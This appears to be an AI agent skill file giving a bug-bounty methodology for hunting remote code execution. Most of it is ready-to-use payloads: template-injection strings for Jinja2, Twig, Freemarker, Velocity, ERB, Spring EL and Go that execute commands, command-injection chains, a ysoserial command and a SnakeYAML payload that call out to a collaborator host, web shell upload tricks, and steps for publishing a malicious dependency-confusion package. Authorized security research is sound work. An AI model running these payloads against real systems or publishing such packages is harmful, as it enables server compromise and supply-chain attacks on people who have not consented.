---
name: hunt-rce
description: |
  Remote Code Execution hunting methodology. Server-Side Template Injection (SSTI),
  deserialization attacks, dependency confusion, command injection, file upload to RCE,
  Spring/Struts exploits, and enterprise product vulnerability chaining.
triggers:
  - hunt rce
  - test for rce
  - remote code execution
  - template injection
  - command injection
  - deserialization
  - code execution
  - ssti
category: security
---
# RCE Hunting Methodology

Adapted from Claude-BugHunter by ElementalSouls.

---

## Crown Jewel Targets

**Highest-paying asset types:**
- **Enterprise server products** (GitHub Enterprise Server, self-hosted GitLab) — privilege escalation from low-privileged roles to root SSH
- **Supply chain / package registries** — dependency confusion against npm, PyPI, etc.
- **Cloud-native infrastructure** — exposed Kubernetes API servers, ingress controllers, misconfigured CI/CD
- **Admin/management consoles** — template injection in config panels reaches root with one payload
- **File upload functionalities** — SVG, ZIP, PDF parsers, image processing pipelines

---

## Attack Surface Signals

### URL Patterns
```
/management-console/*   /admin/settings/*      /api/v*/exec
/api/v*/run             /webhook/*             /_internal/*
/import?url=            /render?template=      /preview?format=
/debug                  /console               /actuator
```

### Tech Stack Signals
| Signal | RCE Vector |
|---|---|
| `X-Powered-By: Express` | Node.js — npm dependency surface |
| `X-Powered-By: Phusion Passenger` | Ruby/Rails |
| `Server: nginx (ingress-nginx)` | Kubernetes ingress — path field injection |
| `Content-Type: application/yaml` | SnakeYAML deserialization |
| `X-GitHub-Enterprise-Version` | GHAS nomad template injection |
| `Server: Apache/2.4.49` | CVE-2021-41773 path traversal → RCE |

### Frontend Signals
```javascript
// Look in JS bundles
fetch('/api/exec', {method:'POST', body: cmd})
eval(userInput)
new Function(userInput)
```

---

## SSTI (Server-Side Template Injection)

### Detection Polyglot
```
{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}
```
If `49` or `7*7` appears in the response → template injection confirmed.

### Context-Specific Payloads

**Jinja2 (Python/Flask):**
```jinja2
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Twig (PHP):**
```
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

**Freemarker (Java):**
```
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","id","start")}
```

**Velocity (Java):**
```
#set($x=$foo.class.forName('java.lang.Runtime'))
#set($y=$x.getRuntime())
$y.exec('id')
#set($e=$x.getRuntime().exec('id'))
$e.waitFor()
```

**ERB (Ruby):**
```
<%= 7*7 %>
<%= system("id") %>
<%= `id` %>
<%= File.read('/etc/passwd') %>
```

**Spring EL:**
```
${7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}
```

**Go text/template:**
```
{{ . }}
{{ .Env.HOME }}
{{ pipe "id" }}
{{ "id" | out "" }}
```

---

## Command Injection

### Detection
```bash
; id                # Command chaining
| id                # Pipe
|| id               # OR operator
& id && id          # Background + AND
`id`                # Backtick execution
$(id)               # Subshell
; sleep 5           # Time-based detection
```

### Injection Points
- Form fields (hostname, IP, domain fields)
- File upload filenames
- Ping/traceroute/nslookup tools
- PDF/image generation tools
- Log shipping / data export features
- Cron job / scheduler configuration

---

## Deserialization Attacks

### Java Deserialization
Look for:
- `Content-Type: application/x-java-serialized-object`
- `Accept: application/x-java-serialized-object`
- Cookies ending in `rO0AB` (Base64 Java serialization)
- `JSESSIONID` cookie-like values that are Base64-encoded objects

**Detection:**
```bash
# DNS out-of-band via ysoserial
java -jar ysoserial.jar CommonsCollections1 'curl http://YOUR.burpcollaborator.net' | base64
```

### PHP Deserialization
Look for:
- Serialized PHP objects in cookies, forms, parameters
- Pattern: `O:4:"User":2:{s:4:"name";s:4:"test";}`

### Python Pickle
Look for:
- Base64-encoded pickle data
- Starts with `gAN9` (base64 of pickle protocol 2 header)
- REST APIs returning serialized Python objects

### YAML Deserialization (SnakeYAML)
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://YOUR.burpcollaborator.net/yaml-payload.jar"]
  ]]
]
```

---

## File Upload → RCE

### Upload Techniques
1. **Direct script upload**: `shell.php`, `shell.aspx`, `shell.jsp`
2. **Double extension**: `shell.php.jpg`, `shell.php%00.jpg`
3. **Content-Type manipulation**: Change `Content-Type: image/jpeg` for PHP shell
4. **Magic bytes**: Prefix with GIF89a; PNG header bytes
5. **.htaccess override**: Upload `.htaccess` with `AddType application/x-httpd-php .jpg`
6. **Web.config override**: ASP.NET `web.config` with `unsafe` parsing
7. **ZIP slip**: ZIP with symlinks or path traversal filenames
8. **SVG with script**: `<script>` in SVG XML → XSS or SSRF to RCE chain
9. **Polyglot**: Image + PHP code (exiftool embed, then include)
10. **XML-based formats**: DOCX, XLSX with XXE → SSRF → RCE chain

### Key Test
```bash
# After upload, try to access the file directly
curl -X POST -F "file=@shell.php" https://target.com/upload/
curl https://target.com/uploads/shell.php?cmd=id
```

---

## Dependency Confusion

### Methodology
1. Identify internal package names used by the target
2. Check JS bundles, error messages, GitHub repos for internal module names
3. Scan `package.json`, `requirements.txt`, `Gemfile`, `pom.xml` if accessible
4. For each internal-sounding package name, check if it exists on public registry
5. If NOT on public registry → register a higher-versioned package with RCE payload

### Detection
```javascript
// In JS bundles — look for @company/internal-package
require('@target/internal-lib')
import('@target/internal-tool')
```

---

## Kubernetes/Nomad/Ingress Injection

### Ingress-NGINX Annotation Injection
If you can edit ingress annotations:
```yaml
nginx.ingress.kubernetes.io/configuration-snippet: |
  more_set_headers "X-Injected: true";
  access_log /dev/stdout;
```

### Nomad Template Injection
```hcl
template {
  data = "{{ env \"NOMAD_SECRET_ID\" }}"
  destination = "/tmp/secrets"
}
```

---

## Validation Checklist

Before reporting RCE:

- [ ] Command executed and output returned in response
- [ ] OR out-of-band callback confirmed (DNS/HTTP to your listener)
- [ ] Verified with `id`, `hostname`, `whoami`, `uname -a` — not just sleep
- [ ] Confirmed execution is server-side, not client-side (browser)
- [ ] Shell is interactive enough to read output
- [ ] Determined user context (www-data, root, container)
- [ ] For blind RCE: file write to web-accessible directory confirmed
- [ ] Impact clearly described: "Attacker can execute arbitrary commands on the server"
